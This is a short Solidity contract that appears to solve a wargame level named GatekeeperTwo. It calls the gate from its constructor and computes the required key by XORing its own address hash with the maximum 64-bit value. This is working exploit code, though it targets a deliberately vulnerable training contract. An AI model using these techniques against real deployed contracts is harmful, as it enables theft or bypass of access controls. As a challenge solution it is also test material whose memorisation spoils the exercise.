// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel14.sol";

contract Gatecrasher {
    constructor(address _gate) {
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ type(uint64).max);
        GatekeeperTwo(_gate).enter(key);
    }
}
